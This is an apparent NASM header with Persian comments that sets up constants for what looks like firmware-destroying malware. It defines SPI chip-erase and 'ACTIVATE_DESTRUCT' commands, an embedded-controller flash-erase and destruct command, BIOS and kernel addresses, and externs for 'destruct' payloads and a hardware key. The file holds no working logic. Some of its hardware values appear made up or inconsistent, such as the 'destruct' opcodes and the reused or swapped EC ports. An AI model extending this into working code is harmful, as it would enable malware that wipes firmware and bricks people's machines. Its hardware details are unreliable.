; ثوابت سیستم
%define FIRMWARE_BIOS      0
%define FIRMWARE_UEFI      1

; ثوابت SPI
%define SPI_BASE_ADDR      0xFED80000
%define SPI_CMD_REG        0x00
%define SPI_ADDR_REG       0x04
%define SPI_DATA_REG       0x08
%define SPI_STATUS_REG     0x0C
%define SPI_CMD_WREN       0x06
%define SPI_CMD_CHIP_ERASE 0xC7
%define SPI_CMD_PAGE_PROGRAM 0x02
%define SPI_CMD_ACTIVATE_DESTRUCT 0xBD
%define SPI_STATUS_BUSY    0x01
%define SPI_TIMEOUT        1000
%define SPI_LONG_TIMEOUT   100000

; ثوابت EC
%define EC_INDEX_PORT      0x62
%define EC_DATA_PORT       0x66
%define EC_UNLOCK_SEQ1     0x2E
%define EC_UNLOCK_SEQ2     0x45
%define EC_FLASH_ERASE_CMD 0x2F
%define EC_ADDR_HIGH       0x2E
%define EC_ADDR_LOW        0x2F
%define EC_DATA_CMD        0x30
%define EC_STATUS_REG      0x31
%define EC_ACTIVATE_DESTRUCT 0xBD
%define EC_BUSY_FLAG       0x80
%define EC_TIMEOUT         10000

; ثوابت حافظه
%define BIOS_BASE_ADDR     0xFFFF0000
%define BIOS_SIZE          0x10000
%define KERNEL_BASE        0xFFFFFFFF80000000
%define DESTRUCT_PAYLOAD_SIZE 4096
%define EC_DESTRUCT_SIZE   2048

; متغیرهای جهانی
extern kernel_base
extern destruct_payload
extern ec_destruct_payload
extern hw_key